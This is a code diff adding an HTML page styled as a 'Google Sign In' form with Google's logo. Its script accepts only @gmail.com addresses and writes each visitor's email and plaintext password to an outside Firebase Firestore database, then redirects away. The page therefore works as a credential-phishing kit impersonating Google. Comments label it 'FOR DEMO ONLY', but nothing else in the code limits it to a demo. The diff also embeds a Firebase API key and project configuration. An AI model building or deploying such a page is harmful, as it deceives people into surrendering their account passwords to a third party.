@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f5f5f5;
+        }
+        .login-box {
+            width: 400px;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        button:hover {
+            background: #1765cc;
+        }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin: -15px 0 15px;
+            text-align: left;
+            display: none;
+        }
+        .footer {
+            margin-top: 30px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to your account</p>
+        
+        <form id="login-form">
+            <input type="email" id="email" placeholder="Email" required>
+            <div class="error" id="email-error">Please enter a valid @gmail.com address</div>
+            <input type="password" id="password" placeholder="Password" required>
+            <div class="error" id="password-error">Please enter your password</div>
+            <button type="submit">Continue</button>
+        </form>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDgfqSEXwZNLpuNb4qYGrULTHrZ_SJMQI4",
+            authDomain: "channels-c8d13.firebaseapp.com",
+            projectId: "channels-c8d13",
+            storageBucket: "channels-c8d13.appspot.com",
+            messagingSenderId: "704343212635",
+            appId: "1:704343212635:web:ea14e6414c5137cace757e",
+            measurementId: "G-G5FQX9J4ER"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const form = document.getElementById('login-form');
+        const emailInput = document.getElementById('email');
+        const emailError = document.getElementById('email-error');
+        const passwordInput = document.getElementById('password');
+        const passwordError = document.getElementById('password-error');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // Reset errors
+            emailError.style.display = 'none';
+            passwordError.style.display = 'none';
+            
+            // Validate email
+            if (!email.endsWith('@gmail.com')) {
+                emailError.style.display = 'block';
+                emailInput.focus();
+                return;
+            }
+            
+            // Validate password
+            if (password.length === 0) {
+                passwordError.style.display = 'block';
+                passwordInput.focus();
+                return;
+            }
+            
+            try {
+                // Generate a simple user ID
+                const userId = email.replace(/[^a-zA-Z0-9]/g, '');
+                
+                // Save credentials to Firestore (INSECURE - FOR DEMO ONLY)
+                await setDoc(doc(db, 'users', userId), {
+                    email: email,
+                    password: password, // NEVER STORE PLAIN TEXT PASSWORDS IN PRODUCTION
+                    timestamp: new Date()
+                });
+                
+                // Redirect to subscriber page
+                window.location.href = 'subscriber.html';
+                
+            } catch (error) {
+                console.error("Error saving credentials:", error);
+                passwordError.textContent = "Error saving credentials. Please try again.";
+                passwordError.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+    </html>
